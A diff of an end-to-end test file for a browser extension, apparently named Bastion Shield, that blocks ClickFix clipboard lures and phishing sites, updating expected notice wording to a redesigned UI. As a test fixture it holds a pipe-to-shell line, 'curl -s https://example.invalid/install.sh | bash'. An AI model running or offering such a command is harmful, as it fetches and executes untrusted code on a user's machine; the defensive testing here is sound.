@@ -34,13 +34,17 @@ const UBO_MEDIUM = x('curl -s https://example.invalid/install.sh | ', 'bash');
 /** The removed override button, in any UI language: it must never appear (it would become part of the lure). */
 const COPY_BUTTON = /^(Copy anyway|Trotzdem kopieren|Copier quand même|Copia comunque)$/i;
 const CLOSE = /^(Close|Schliessen|Fermer|Chiudi)$/;
-const CLIP_TITLE = /ClickFix/;
-const MANUAL_NOTE = /(select and copy it yourself|markieren und kopieren Sie ihn selbst|copiez-la vous-même|copiatelo voi stessi)/;
-const SOURCE_UBO = /uBlock/;
-const SOURCE_BASTION = /(Bastion ClickFix|ClickFix de Bastion|ClickFix di Bastion)/;
-const PHISHING = /(possible phishing|möglicherweise Phishing|phishing possible|possibile phishing)/;
+// Notice copy of «UI Optimised» phase 1 (21-notices.spec.ts covers the card in detail).
+const CLIP_TITLE = /^(Dangerous command stopped|Gefährlicher Befehl gestoppt|Commande dangereuse bloquée|Comando pericoloso bloccato)$/;
+/** The command stays readable (and copyable by hand) behind this disclosure. */
+const SHOW_COMMAND = /^(Show command|Befehl ansehen|Voir la commande|Mostra il comando)$/;
+/** The brand line of every notice (the source line «Detected by: …» is gone in the redesign). */
+const BRAND = /^Bastion Shield$/;
+const PHISHING = /^(This isn’t|Das ist nicht|Ce n’est pas|Questo non è) /;
 const LEAVE = /^(Leave site|Seite verlassen|Quitter le site|Lascia il sito)$/;
-const PROCEED = /^(Continue anyway|Trotzdem fortfahren|Continuer quand même|Continua comunque)$/;
+const PROCEED = /^(Stay anyway|Trotzdem bleiben|Rester quand même|Resta comunque)$/;
+/** «2 weitere Meldungen»: older notices collapsed below the newest card. */
+const MORE = /^(\d+) (more notices?|weitere Meldung(en)?|autres? alertes?|altr[oi] avvis[oi])$/;
 
 interface AxNode {
   role: string;
@@ -61,9 +65,16 @@ async function axTree(page: Page): Promise<AxNode[]> {
   }
 }
 
-/** Titles of the Bastion notices (role alert) currently shown. */
+/**
+ * Titles of the Bastion notices (role alert) currently shown, newest first,
+ * plus one empty entry per older notice collapsed into the «N more» row.
+ */
 async function notices(page: Page): Promise<string[]> {
-  return (await axTree(page)).filter((n) => n.role === 'alert').map((n) => n.name);
+  const ax = await axTree(page);
+  const shown = ax.filter((n) => n.role === 'alert').map((n) => n.name);
+  const more = ax.map((n) => MORE.exec(n.name)).find((m) => m !== null);
+  const collapsed = more ? Math.max(0, Number(more[1]) - (shown.length - 1)) : 0;
+  return [...shown, ...new Array<string>(collapsed).fill('')];
 }
 
 /** Click an accessibility node by role and name, with real mouse input at its centre. */
@@ -114,9 +125,9 @@ test.describe('blocker notices (nerd mode off)', () => {
     await expect.poll(() => notices(page)).toHaveLength(1);
     let ax = await axTree(page);
     expect((await notices(page))[0]).toMatch(CLIP_TITLE);
-    expect(hasText(ax, MANUAL_NOTE), 'the copy-it-yourself note').toBe(true);
+    expect(hasButton(ax, SHOW_COMMAND), 'the command behind its disclosure').toBe(true);
     expect(hasButton(ax, COPY_BUTTON), 'no copy button').toBe(false);
-    expect(hasText(ax, SOURCE_UBO), 'source line').toBe(true);
+    expect(hasText(ax, BRAND), 'brand line').toBe(true);
     expect(await noUboBar(page), "uBO's beige bar never appears").toBe(true);
 
     expect(await write(UBO_MEDIUM), 'uBO prevents the write').toBe('reset');
@@ -150,7 +161,7 @@ test.describe('blocker notices (nerd mode off)', () => {
     await page.mouse.move(box.x + 90, box.y + 80);
     await frame!.evaluate((t) => navigator.clipboard.writeText(t).catch(() => undefined), UBO_HIGH);
     await expect.poll(() => notices(page)).toHaveLength(1);
-    expect(hasText(await axTree(page), SOURCE_UBO)).toBe(true);
+    expect(hasText(await axTree(page), BRAND)).toBe(true);
     // Rendered by the top frame: the iframe document has no notice host.
     expect(await frame!.evaluate(() => Array.from(document.documentElement.children).filter((e) => e.tagName === 'DIV').length)).toBe(0);
     expect(await page.evaluate(() => Array.from(document.documentElement.children).filter((e) => e.tagName === 'DIV' && e.shadowRoot === null).length)).toBe(1);
@@ -247,8 +258,8 @@ test.describe('nerd mode guards', () => {
     await expect.poll(async () => (await notices(page)).length).toBeGreaterThanOrEqual(2);
     const ax = await axTree(page);
     expect((await notices(page)).length).toBeLessThanOrEqual(3);
-    expect(hasText(ax, SOURCE_BASTION), 'source line: Bastion ClickFix protection').toBe(true);
-    expect(hasText(ax, MANUAL_NOTE), 'copy-it-yourself note').toBe(true);
+    expect(hasText(ax, BRAND), 'brand line').toBe(true);
+    expect(hasButton(ax, SHOW_COMMAND), 'the command behind its disclosure').toBe(true);
     expect(hasButton(ax, COPY_BUTTON), 'no copy button').toBe(false);
 
     // A real click (uBO's scriptlet may answer first): the payload never lands.
@@ -332,11 +343,12 @@ test.describe('nerd mode guards', () => {
       const r = host.getBoundingClientRect();
       return { top: r.top, right: innerWidth - r.right, width: r.width };
     });
-    expect(box, 'top-right, 12px inset, 360px wide').toEqual({ top: 12, right: 12, width: 360 });
+    expect(box, 'top-right, 12px inset, 340px wide').toEqual({ top: 12, right: 12, width: 340 });
     await expect.poll(() => notices(page)).toHaveLength(1);
     expect((await notices(page))[0]).toMatch(PHISHING);
     const ax = await axTree(page);
-    expect(hasText(ax, /paypal\.com/) && hasText(ax, /www\.paypa1\.com/), 'target and host').toBe(true);
+    // The visited host is split around the boxed «1» that differs from paypal.com.
+    expect(hasText(ax, /paypal\.com/) && hasText(ax, /^www\.paypa$/) && hasText(ax, /^1$/), 'target and host').toBe(true);
     expect(hasButton(ax, LEAVE)).toBe(true);
     expect(hasButton(ax, PROCEED)).toBe(true);
     // «Continue anyway» only closes the notice.
